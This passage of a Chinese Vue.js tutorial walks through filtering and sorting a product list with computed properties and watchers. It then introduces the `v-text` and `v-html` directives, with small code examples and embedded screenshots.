- 如果`v-for`中是用来渲染列表，后期并不会对数据做增、删除操作，则`key`的值可以是每一项的索引，如果需要做增删除，则唯一值不能是`index`索引，而必需是其它唯一值。

### 10、案例：展示数组过滤后数据

当我们想要在页面中显示数组经过过滤后或排序后的内容，而又不能更改原数组的情况下，我们可以通过计算属性来实现。

创建一个计算属性，计算属性的返回值为原数组经过过滤或排序后得到的新数组。

**代码演示：根据价格来显示对应商品**

> 我们用`watch`侦听器和`computed`计算属性两种方式来实现，然后通过对比，看那一种更优。

![GIF2023-5-519-07-07](https://www.arryblog.com/assets/img/GIF2023-5-519-07-07.df922863.gif)

- `watch`侦听器实现

```vue
<script>
export default {
  data() {
    return {
      productPrice: 0, // 初始筛选价格为0
      filterProducts: [], // 过滤后数组存放到这个数组
      productList: [
        // 源数据数组
        {
          title: "短袖T恤男夏季新款印花宽松休闲",
          price: 39,
        },
        {
          title: "鼎铜毛呢夹克男中年男士商务休闲",
          price: 290,
        },
        {
          title: "t恤男短袖中年拼色撞色半袖",
          price: 190,
        },
        {
          title: "女半袖体恤chic宽松上衣 米白",
          price: 88,
        },
        {
          title: "连衣裙女装2023春夏季新款",
          price: 220,
        },
        {
          title: "短袖t恤女夏季新款韩版洋气时尚",
          price: 390,
        },
        {
          title: "休闲裤女装夏季时尚套装女",
          price: 320,
        },
      ],
    };
  },
  watch: {
    // 侦听器
    productPrice: {
      handler(newValue) {
        this.filterProducts = this.productList.filter(({ price }) => {
          return price > newValue;
        });
      },
      immediate: true, // 强制立即执行回调
    },
  },
};
</script>

<template>
  <input type="text" v-model="productPrice" />
  <ul>
    <li v-for="item in filterProducts">{{ item.title }}--{{ item.price }}</li>
  </ul>
</template>
```

- `computed`计算属性来实现

```vue
<script>
export default {
  data() {
    return {
      productPrice: 0,
      productList: [
        {
          title: "短袖T恤男夏季新款印花宽松休闲",
          price: 39,
        },
        {
          title: "鼎铜毛呢夹克男中年男士商务休闲",
          price: 290,
        },
        {
          title: "t恤男短袖中年拼色撞色半袖",
          price: 190,
        },
        {
          title: "女半袖体恤chic宽松上衣 米白",
          price: 88,
        },
        {
          title: "连衣裙女装2023春夏季新款",
          price: 220,
        },
        {
          title: "短袖t恤女夏季新款韩版洋气时尚",
          price: 390,
        },
        {
          title: "休闲裤女装夏季时尚套装女",
          price: 320,
        },
      ],
    };
  },
  computed: {
    // 计算属性
    filterProducts() {
      return this.productList.filter(({ price }) => {
        return price > this.productPrice;
      });
    },
  },
};
</script>

<template>
  <input type="text" v-model="productPrice" />
  <ul>
    <li v-for="item in filterProducts">{{ item.title }}--{{ item.price }}</li>
  </ul>
</template>
```

> 显然，通过对比，`computed`的方式更简洁。官方也推荐我们采用计算属性来实现。

温馨提示：

所有操作数据的方法，如果此方法会更改原数组，则可以利用计算属性来实现。

### 11、案例：对筛选后数组排序

接下来，我们在上面的案例的基础上再升级一下，我们针对过滤后的数据，再做相关的排序：升序，降序，恢原。

**代码演示：在数据过滤的基础上再排序**

![GIF2023-5-520-54-27](https://www.arryblog.com/assets/img/GIF2023-5-520-54-27.c1b09235.gif)

`computed` 计算属性实现

```vue
<script>
export default {
  data() {
    return {
      productPrice: 0,
      sortType: 0, // 0 不排序，1升序 2降序
      productList: [
        {
          title: "短袖T恤男夏季新款印花宽松休闲",
          price: 39,
        },
        {
          title: "鼎铜毛呢夹克男中年男士商务休闲",
          price: 290,
        },
        {
          title: "t恤男短袖中年拼色撞色半袖",
          price: 190,
        },
        {
          title: "女半袖体恤chic宽松上衣 米白",
          price: 88,
        },
        {
          title: "连衣裙女装2023春夏季新款",
          price: 220,
        },
        {
          title: "短袖t恤女夏季新款韩版洋气时尚",
          price: 390,
        },
        {
          title: "休闲裤女装夏季时尚套装女",
          price: 320,
        },
      ],
    };
  },
  // 计算属性
  computed: {
    filterProducts() {
      // 过滤数据
      const arr = this.productList.filter(({ price }) => {
        return price > this.productPrice;
      });
      // 对过滤后数据排序
      //如果this.sortType===0，则不排序，不在考虑范围内
      if (this.sortType) {
        return arr.sort((item1, item2) => {
          return this.sortType === 1
            ? item1.price - item2.price
            : item2.price - item1.price;
        });
      }
      return arr; // 如果不排序时，也要有返回值
    },
  },
};
</script>

<template>
  <div>
    <input type="text" v-model="productPrice" />
    <button @click="sortType = 1">升序</button>
    <button @click="sortType = 2">降序</button>
    <button @click="sortType = 0">还原</button>
  </div>

  <ul>
    <li v-for="item in filterProducts">{{ item.title }}--{{ item.price }}</li>
  </ul>
</template>
```

### 12、案例：显示数组排序后内容

如果我们只对数组中的数据做相关的排序操作，则需要特别注意`sort()`方法的使用。

- `sort()`方法会更改原始数组
- 请在调用`sort()`方法排序时，先创建一个原始数组的副本，利用副本来操作数据，这样就能保证原数组不变。

```js
// 错误写法 ，这样原数组会被修改
this.productList.sort()

// 正确写法 创建一个副本，利用这个副本来操作数据
[...this.productList].sort()
```

**代码演示：对数组进行排序，并显示排序结果**

![GIF2023-5-520-52-43](https://www.arryblog.com/assets/img/GIF2023-5-520-52-43.b984625e.gif)

```vue
<script>
export default {
  data() {
    return {
      sortType: 0, // 0 不排序，1升序 2降序
      productList: [
        {
          title: "短袖T恤男夏季新款印花宽松休闲",
          price: 39,
        },
        {
          title: "鼎铜毛呢夹克男中年男士商务休闲",
          price: 290,
        },
        {
          title: "t恤男短袖中年拼色撞色半袖",
          price: 190,
        },
        {
          title: "女半袖体恤chic宽松上衣 米白",
          price: 88,
        },
        {
          title: "连衣裙女装2023春夏季新款",
          price: 220,
        },
        {
          title: "短袖t恤女夏季新款韩版洋气时尚",
          price: 390,
        },
        {
          title: "休闲裤女装夏季时尚套装女",
          price: 320,
        },
      ],
    };
  },
  // 计算属性
  computed: {
    sortProducts() {
      if (this.sortType) {
        // 注意，创建原数据的副本
        return [...this.productList].sort((item1, item2) => {
          return this.sortType === 1
            ? item1.price - item2.price
            : item2.price - item1.price;
        });
      }
      // 如果上面不创建原始数据的副本，则我们点击还原按扭时，将无任何效果
      return this.productList;
    },
  },
};
</script>

<template>
  <div>
    <button @click="sortType = 1">升序</button>
    <button @click="sortType = 2">降序</button>
    <button @click="sortType = 0">还原</button>
  </div>

  <ul>
    <li v-for="item in sortProducts">{{ item.title }}--{{ item.price }}</li>
  </ul>
</template>
```

## 五、其它内置指令

> 在前面我们学习了 Vue 相关的内置指令，如：

| 内置指令                      | 说明                                            |
| :---------------------------- | :---------------------------------------------- |
| `v-bind`                      | 单向数据绑定，用来动态绑定元素的属性，简写成`:` |
| `v-model`                     | 双向数据绑定，常用在表单输入元素上              |
| `v-on`                        | 给元素绑定事件监听器，简写成：`@`               |
| `v-if`与`v-else`与`v-else-if` | 根据表达式的真假性，来条件性地渲染元素          |
| `v-show`                      | 根据表达式的真假性，来改变元素的显示与隐藏      |
| `v-for`                       | 基于原始数据（数组、对象等）来渲染元素          |

> 本小节，我们继续来学习 Vue 相关的其它内部指令：`v-text`、`v-html`、`v-once`、`v-cloak`、`v-pre`

### 1、v-text 指令

`v-text`指令用于更新元素的`innerText`文本内容，他会替换当前元素内的所有节点内容。

```vue
<script>
export default {
  data() {
    return {
      message: "Hello Vue!",
    };
  },
};
</script>

<template>
  <div v-text="message"></div>
</template>
```

`v-text`指令中的内容如果包含`html`标签，`html`标签并不会被编译，而是会当前字符串原样输出

```vue
<script>
export default {
  data() {
    return {
      message: "<h3>Hello Vue!</h3>",
    };
  },
};
</script>

<template>
  <div v-text="message"></div>
</template>
```

![image-20230506203616098](data:image/png;base64,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)

### 2、v-html 指令

`v-html`指令用于更新元素的`innerHTML`内容

- 如果内容中包含`html`标签，会被正常显示
- 如果内容中包含 Vue 模板语法，则不会被解析

```vue
<script>
export default {
  data() {
    return {
      info: "我是清心",
      message: "<h3>Hello Vue! {{info}} </h3>",
    };
  },
};
</script>

<template>
  <div v-html="message"></div>
</template>
```

![image-20230506204442579](data:image/png;base64,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